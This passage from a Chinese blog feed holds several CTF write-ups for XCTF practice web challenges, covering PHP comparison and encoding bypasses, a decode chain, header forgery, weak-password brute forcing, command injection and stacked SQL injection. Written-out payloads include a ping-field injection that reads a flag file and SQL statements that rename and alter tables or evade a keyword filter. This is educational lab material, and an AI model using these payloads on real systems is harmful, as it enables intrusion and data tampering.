<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">str_rot13(string $string): string</span><br><span class="line">对 string 参数执行 ROT13 编码并将结果字符串返回。</span><br><span class="line"></span><br><span class="line">ROT13 编码简单地使用字母表中后面第 13 个字母替换当前字母，同时忽略非字母表中的字符。</span><br><span class="line">编码和解码都使用相同的函数，传递一个编码过的字符串作为参数，将得到原始字符串。</span><br></pre></td></tr></table></figure></li>
</ul>
<p>根据提示可知，我们需要通过逆向加密算法解密变量miwen。</p>
<ol start="2">
<li>解密</li>
</ol>
<ul>
<li>rot13解密，得到：(不可忽略字符大小写)<br><code>n1mYotDfPRFRVdEYjhDNlZjYld2Y5IjOkdTN3EDNlhzM0gzZiFTZ2MjO4gjf</code></li>
<li>倒转后，得到：<br><code>fjg4OjM2ZTFiZzg0MzhlNDE3NTdkOjI5Y2dlYjZlNDhjYEdVRFRPfDtoYm1n</code></li>
<li>base64解密后，得到：<br>~88:36e1bg8438e41757d:29cgeb6e48c`GUDTO|;hbmg</li>
<li>所有字符的ASCII顺序减1，得到：<br>}77925d0af7327d30646c918bfda5d37b-FTCSN{:galf</li>
<li>再次倒转，得到：<br><code>flag:&#123;NSCTF_b73d5adfb819c64603d7237fa0d52977&#125;</code></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界_PHP2</title>
    <url>/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_PHP2/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一道很简单的题，但我因为基础不牢，导致做不出来。</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>查看源码<br>首先页面显示没有意义的一句话。<br>然后我们点鼠标右键尝试查看源代码，无法看到。<br>于是尝试其它方式，比如在url后面加index.phps：<br><code>url/index.phps</code><br>源代码成功显示（用工具扫一下会比较好）</p>
</li>
<li><p>分析条件<br>我们看到源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;admin&quot;</span>===<span class="variable">$_GET</span>[id]) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[id] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Can you anthenticate to this website?</span><br></pre></td></tr></table></figure>
<p>第1个if语句：要求不能直接在url栏输入admin，否则不予通过。<br>第2个if语句：url解码后的值要与admin相同。</p>
</li>
<li><p>构造语句<br>url编码就是一个字符ascii码的十六进制。不过稍微有些变动，需要在前面加上“%”。<br>因此我们将a进行url编码，可得到%61dmin<br>解码后与admin值相同。<br>但这样还不够，因为url栏会先对传上的值解一次码，变成admin，这样在判断第1个if语句时仍然无法通过。<br>因此我们需要二次编码绕过。将%61再次进行编码：%2561<br>最终得到： <code>%2561dmin</code><br>最后拿到flag</p>
</li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界_Web新手练习区</title>
    <url>/2022/12/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_Web%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是攻防世界一些比较简单的题，算是用来补充知识的。</p>
<span id="more"></span>
<h1 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a>view_source</h1><p>直接按下F12，从Elements中找到flag</p>
<h1 id="get-post"><a href="#get-post" class="headerlink" title="get_post"></a>get_post</h1><p>首先根据要求在搜索框后加上： <code>/?a=1</code>  然后提交<br>之后根据要求，先抓包，然后将首部的GET请求改为POST请求<br>再在下面添加：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">b=2</span><br></pre></td></tr></table></figure>
<p>即可拿到flag</p>
<p>关于post的更多知识可以看：<a href="https://developer.mozilla.org/zh-CN/docs/Learn/Forms/Sending_and_retrieving_form_data">GET&amp;POST</a></p>
<h1 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h1><p>直接在url后面加上：<br><code>/robots.txt</code><br>然后把获得的php文件名加在url后面，即可拿到flag</p>
<h1 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h1><p>需要寻找index.php的备份文件，那么常见的备份文件后缀：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar, tae.gz, zip, rar, bak, dat, txt, log, mdb, bz2, tar.bz2, 7z</span><br></pre></td></tr></table></figure>
<p>常见的网站源码备份文件名：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">web, website, backup, back, www, wwwroot, temp</span><br></pre></td></tr></table></figure>
<p>更详细的解释可以看看：<a href="https://mayi077.gitee.io/2020/03/04/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6/">备份文件</a><br>bak是自动创建的备份文件，因此首先尝试，出现下载框，下载后记事本方式打开，得到flag</p>
<h1 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h1><p>明示了与cookie相关，所以我们直接查看cookie，发现指示我们打开cookie.php页面，打开后又发现页面写着看http response，所以我们抓包后，send to repeater，看响应，最终拿到flag</p>
<h1 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h1><p>不能按的按钮，那我们直接按下F12检查页面，发现在按钮处有个disabled。<br>这里浏览器之间有个有趣的小差别：<br>FireFox是直接删除disabled元素即可显示flag<br>chrome需要把disabled改为enabled才能显示flag</p>
<h1 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h1><p>打开后有一个输入密码的弹窗，没什么用。<br>按下F12查看元素，发现有一段script代码，我们仔细查看，发现一串可疑的16进制数据。<br>将16进制数据拿去转码为10进制，再通过python的一段代码编写（s数组内即为转码后的10进制数据）：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">s = [<span class="number">55</span>,<span class="number">56</span>,<span class="number">54</span>,<span class="number">79</span>,<span class="number">115</span>,<span class="number">69</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">107</span>,<span class="number">49</span>,<span class="number">50</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>成功得到flag。</p>
<h1 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h1><ul>
<li>xff 是http的拓展头部，作用是使Web服务器获取访问用户的IP真实地址（可伪造）。由于很多用户通过代理服务器进行访问，服务器只能获取代理服务器的IP地址，而xff的作用在于记录用户的真实IP，以及代理服务器的IP。<br>格式为：X-Forwarded-For: 本机IP, 代理1IP, 代理2IP, 代理2IP</li>
<li>referer 是http的拓展头部，作用是记录当前请求页面的来源页面的地址。服务器使用referer确认访问来源，如果referer内容不符合要求，服务器可以拦截或者重定向请求。</li>
</ul>
<p>题目明示伪造xff和referer，那么我们直接打开页面抓包，在包的首部添加字段：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Referer:https://www.google.com</span><br><span class="line">X-Forwarded-for:123.123.123.123</span><br></pre></td></tr></table></figure>
<p>即可得到flag</p>
<h1 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h1><p>这一关用到了弱口令爆破。<br>但其实之前我并没有学这个知识，所以一开始很迷惑，但还好，这部分知识并不复杂。<br>是一个登录界面，直接抓包。<br>抓包后发送到Intruder。看到Positions，我们会发现需要爆破的地方被用另一种颜色涂抹了，由于只需要爆破密码。所以把其它位置的$符号去掉，只保留密码处的，然后用户名是admin。<br>之后看到Payloads那里，我们需要一个字典来爆破，这样会比较高效。在Payload Options处导入我们准备好的字典后，直接开始攻击。<br>很快，我们发现payloads为123456处那里的字段长度与别的不同，我们检查这个包，发现response里面就有flag。</p>
<h1 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a>command_execution</h1><p>这一关打开是一个ping命令，然后结合题目信息，我们可以从远程命令执行入手（RCE）。<br>那么Windows远程命令常用的有 <code>&amp;  &amp;&amp;  |  ||</code><br>随便用那个都行，直接输入以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &amp;&amp; find / -name &quot;flag*&quot;</span><br></pre></td></tr></table></figure>
<p>可以找到一个名为 <code>flag.txt</code>  的文件，于是我们可以执行以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &amp;&amp; cat /home/flag.txt</span><br></pre></td></tr></table></figure>
<p>即可得到flag</p>
<h1 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h1><p>本题的代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>==<span class="number">0</span> <span class="keyword">and</span> <span class="variable">$a</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span>&gt;<span class="number">1234</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这道题主要是考察对php的熟悉程度，虽然不难，但基础不好也容易掉入陷阱。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show_source 	show_source() 函数对文件进行语法高亮显示,是 highlight_file() 的别名</span><br><span class="line">include 		include （或 require）语句会获取指定文件中存在的所有文本/代码/标记，并复制到使用 include 语句的文件中</span><br></pre></td></tr></table></figure>
<p>代码搞清楚后，那么接下来看如何处理<br>要求是以get方式传入a,b参数，</p>
<ul>
<li>a的要求<br>值为0，且参数a本身不为flase<br>那么不能为数字0，因为会被解析为false<br>而我们知道字符型数据会被转化为0与数字比较，<br>因此随便填个字符即可满足要求</li>
<li>b的要求<br>不能为数字，且值要大于1234<br>那么直接来个2345a</li>
</ul>
<p>所以最终结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=a&amp;b=2345a</span><br></pre></td></tr></table></figure>
<p>即可拿到flag</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本次总共11道题，每道题都非常简单，主要是考察基础知识，对于新手而言还是很有帮助的。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>正是简单才看出基础。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界_easyphp</title>
    <url>/2022/12/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_easyphp/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>做了这题才知道自己的php掌握的有多么糟糕…</p>
<span id="more"></span>
<h1 id="题目来源"><a href="#题目来源" class="headerlink" title="题目来源"></a>题目来源</h1><p>攻防世界-&gt;easyphp</p>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><p>首先是页面代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$key1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$key2</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$a</span>) &gt; <span class="number">6000000</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>) &lt;= <span class="number">3</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$b</span>) &amp;&amp; <span class="string">&#x27;8b184b&#x27;</span> === <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>),-<span class="number">6</span>,<span class="number">6</span>))&#123;</span><br><span class="line">        <span class="variable">$key1</span> = <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Emmm...再想想&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Emmm...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=(<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>) &amp;&amp; !<span class="title function_ invoke__">is_numeric</span>(@<span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>]) &amp;&amp; <span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>] &gt; <span class="number">2022</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(@<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) == <span class="number">2</span> &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>][<span class="number">0</span>]))&#123;</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;DGGJ&quot;</span>, <span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]);</span><br><span class="line">        <span class="variable">$d</span> === <span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;no...&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;DGGJ&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;no......&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$key2</span> = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> &amp;&amp; <span class="variable">$key2</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;Hgfks.php&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You&#x27;re right&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<ol>
<li><p>查看传参类型以及数量<br>我们通看整个页面，发现需要传a,b,c三个参数，且均以GET方式传递。</p>
</li>
<li><p>参数a的要求<br>我们重点看这段源代码：<br><code>if(isset($a) &amp;&amp; intval($a) &gt; 6000000 &amp;&amp; strlen($a) &lt;= 3)</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">isset() 	判断参数的值是否存在</span><br><span class="line">intval()	用于获取变量的整数值</span><br><span class="line">strlen()	判断参数长度</span><br></pre></td></tr></table></figure>
<p><a href="https://www.runoob.com/php/php-intval-function.html">intval()函数</a></p>
</li>
</ol>
<p>函数的作用搞清楚后，接下来便是弄清楚符合的条件。<br>既要参数a的值大于600000又要长度小于3，那么只能用科学计数法。<br>当a&#x3D;1e5时，十进制数值为10000<br>由此可知，参数a的选值可以为:1e7&#x2F;8&#x2F;9</p>
<ol start="3">
<li>参数b的要求<br>我们重点看这段源代码：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$b</span>) &amp;&amp; <span class="string">&#x27;8b184b&#x27;</span> === <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>),-<span class="number">6</span>,<span class="number">6</span>))&#123;</span><br><span class="line">        <span class="variable">$key1</span> = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">substr 	返回字符串的一部分</span><br><span class="line">md5 	计算括号内参数的md5值</span><br></pre></td></tr></table></figure>
<a href="https://www.runoob.com/php/func-string-substr.html">substr()函数</a></li>
</ol>
<p>这段代码翻译过来意思为：<br>参数b的md5值的最后6位是否全等于’8b184b’。<br>这种情况我们用手算是无法计算的，于是需要用PHP写一个简单的脚本来获取符合条件的值：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span>&lt;<span class="number">100000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;8b184b&#x27;</span> === <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>),-<span class="number">6</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable">$i</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>最终得出参数b的值为：53724</p>
<ol start="4">
<li>参数c的要求<br>我们重点看这段代码：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$c</span>=(<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>) &amp;&amp; !<span class="title function_ invoke__">is_numeric</span>(@<span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>]) &amp;&amp; <span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>] &gt; <span class="number">2022</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(@<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) == <span class="number">2</span> &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>][<span class="number">0</span>]))&#123;</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;DGGJ&quot;</span>, <span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]);</span><br><span class="line">        <span class="variable">$d</span> === <span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;no...&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;DGGJ&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;no......&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$key2</span> = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>确定c[“m”]的值<br>通过代码可知，我们需要json格式的参数c。<br>参数c需要满足数组格式，且c[“m”]的类型不能为数字类型，且c[“m”]的值需要大于2022。<br>我们知道在php中，当字符串的首位为字符，并与整数比较时，字符串的值会转化为0，举例而言就是’a123’会变成0；<br>但是当字符串首位为数字，并与整数比较时，此时字符串会将字符之前的数字与整数比较，比如：’1a23’会变为1，’123a’会变为123</li>
</ul>
<p>于是我们可以构造出c[“m”]的值为：12345a</p>
<ul>
<li>确定c[“n”]的值<br>通过代码可知c[“n”]的类型为数组，且数组中有2个值，且c[“n”][0]的类型也是数组。大致为[[x,x,…],x]<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array_search 	在数组中搜索某个键值，并返回对应的键名</span><br></pre></td></tr></table></figure>
<a href="https://www.runoob.com/php/func-array-search.html">array_search()函数</a><br>可知该函数是查找值相同的元素，那么类型不同也可以。<br>那么此时就产生了两种可选的值：0或’DGGJ’<br>但由于下面的foreach不能与DGGJ匹配，因此我们只能选0<br>因此c[“n”]的值为：[[0,2],0]</li>
</ul>
<p>最终payload为：<br><code>/?a=1e9&amp;b=53724&amp;c=&#123;&quot;m&quot;:&quot;12345a&quot;, &quot;n&quot;:[[0,2],0]&#125;</code><br>提交得到flag。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这道题倒是让我受到不少收获，感觉蛮好。是我应该会却不会的内容，代码审计能力提升了~</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/weixin_46906325/article/details/127154789">攻防世界web新手区easyphp题解writeup</a><br><a href="https://blog.csdn.net/qq_56426046/article/details/127194240?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-127194240-blog-127154789.pc_relevant_3mothn_strategy_recovery&spm=1001.2101.3001.4242.1&utm_relevant_index=3">攻防世界easyphp解题wp</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界_supersqli</title>
    <url>/2022/12/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_supersqli/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第一次做的CTF题目，虽然简单，但由于我已经很久没碰SQL注入的东西了，忘得七七八八，导致做不出来。</p>
<span id="more"></span>
<h1 id="题目来源"><a href="#题目来源" class="headerlink" title="题目来源"></a>题目来源</h1><p>攻防世界 -&gt; supersqli</p>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>初步尝试<br><code>1&#39;</code> 出现了报错，并且根据报错信息可知，就是使用1’注入<br><code>1&#39; order by 2#</code> 可知列数为2<br><code>1&#39; union select 1,2 #</code> 发现遇到一个报错：<br><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code><br>尝试大小写，双写，注释符，内联等绕过方式后均无果，于是考虑别的办法</p>
</li>
<li><p>堆叠注入<br>在多次尝试后，选择堆叠注入。<br><code>1&#39;;show databases; --+</code><br>成功显示数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;show tables; --+</span><br><span class="line"></span><br><span class="line">成功显示表名：</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(16) &quot;1919810931114514&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;words&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对每个表名查询字段，查询字段时需要将表名用反引号（`）括起来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;show columns from `1919810931114514`; --+</span><br><span class="line"></span><br><span class="line">字段如下：</span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;varchar(100)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;show columns from `words`; --+</span><br><span class="line"></span><br><span class="line">字段如下：</span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(2) &quot;id&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;int(10)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;data&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(11) &quot;varchar(20)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从上面查询可知，我们所需的flag在表名为“1919810931114514”当中。<br>接下来就是如何获取到该字段</p>
</li>
<li><p>获取flag</p>
</li>
</ol>
<ul>
<li><p>方法1：预编译<br><a href="https://www.cnblogs.com/geaozhang/p/9891338.html">预编译的知识</a><br>简单来说有三步：<br>set @xxx &#x3D; 需要查询的语句;<br>prepare stmt from @xxx;<br>execute stmt;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;sEt @sql = CONCAT(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;);prEpare stmt from @sql;EXECUTE stmt;#</span><br></pre></td></tr></table></figure>
<p>即可获得flag</p>
</li>
<li><p>方法2：改表名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);#</span><br></pre></td></tr></table></figure>
<p>改好后再通过这个语句查询：<br><code>1&#39; or 1=1 #</code><br>即可获得flag</p>
</li>
</ul>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>好好学习，天天向上</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Mr_helloword/article/details/107935479">攻防世界-supersqli详解</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>SQL注入</category>
      </categories>
      <tags>
